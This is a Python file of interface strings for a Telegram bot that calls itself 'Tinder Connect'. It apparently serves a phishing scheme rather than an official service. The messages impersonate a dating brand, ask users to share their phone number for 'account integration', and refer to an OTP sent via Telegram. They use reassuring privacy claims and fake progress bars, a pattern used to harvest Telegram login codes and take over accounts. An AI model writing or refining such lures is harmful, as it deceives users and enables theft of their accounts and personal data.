# ===========================
# Tinder Connect Premium UI
# ===========================


DIVIDER = "━━━━━━━━━━━━━━━━━━"

BRAND = "❤️ <b>Tinder Connect</b>"


def premium_box(title, message):
    return f"""
{DIVIDER}

{BRAND}

{title}

{message}

{DIVIDER}
"""


# ===========================
# START / WELCOME
# ===========================

WELCOME_MESSAGE = premium_box(
    "✨ <b>Secure Account Assistant</b>",
    """
Welcome!

Manage your dating experience with a modern and secure platform.

🔒 <b>Security Notice</b>

• Keep your account information private.
• Always use official services.
• Avoid sharing sensitive information.

📱 Choose an option below to continue.
"""
)


# ===========================
# REGISTRATION PROGRESS
# ===========================

STEP_ONE = premium_box(
    " <b>Registration Progress</b>",
    """
 📱 Please click the 
   [Share Your Phone Number]
     button to continue.

Your phone number is required only to process your account integration. We are very careful about your privacy, and your information will only be used for account verification and integration purposes.

⚠️ NB. Don't put the OTP code we send you via Telegram into any Telegram apps or Mini Apps. Your OTP is private and should only be used for the official verification process.




████░░░░░░ 33%

Starting setup...
"""
)


STEP_TWO = premium_box(
    "🚀 <b>Registration Progress</b>",
    """
🟢 Step 2 of 3

██████░░░░ 66%

Verification in progress...
"""
)


STEP_THREE = premium_box(
    "🚀 <b>Registration Progress</b>",
    """
🟢 Step 3 of 3

██████████ 100%

Setup completed.
"""
)


# ===========================
# PHONE VERIFICATION
# ===========================

PHONE_VERIFIED = premium_box(
    "📱 <b>Phone Verified</b>",
    """
Your phone information has been received successfully.

🔐 Continue with the next step.
"""
)


# ===========================
# LOADING / PROCESSING
# ===========================

VERIFYING = premium_box(
    "🔐 <b>Verification In Progress</b>",
    """
⏳ Please wait...

Our system is processing your request.

This may take a few moments.
"""
)


LOADING = premium_box(
    "⏳ <b>Please Wait</b>",
    """
Processing...

⚡ Almost complete.
"""
)


# ===========================
# SUCCESS
# ===========================

SUCCESS = premium_box(
    "🎉 <b>Completed Successfully</b>",
    """
Your setup has been completed.

❤️ Welcome to Tinder Connect.
"""
)


# ===========================
# ERROR STATES
# ===========================

INVALID_INPUT = premium_box(
    "⚠️ <b>Invalid Input</b>",
    """
The information provided could not be processed.

Please try again.
"""
)


ERROR_MESSAGE = premium_box(
    "❌ <b>Something Went Wrong</b>",
    """
An unexpected error occurred.

Please try again later.
"""
)


# ===========================
# HELP
# ===========================

HELP_MESSAGE = premium_box(
    "❓ <b>Help Center</b>",
    """
Need assistance?

Our support team is here to help.

Choose an option below.
"""
)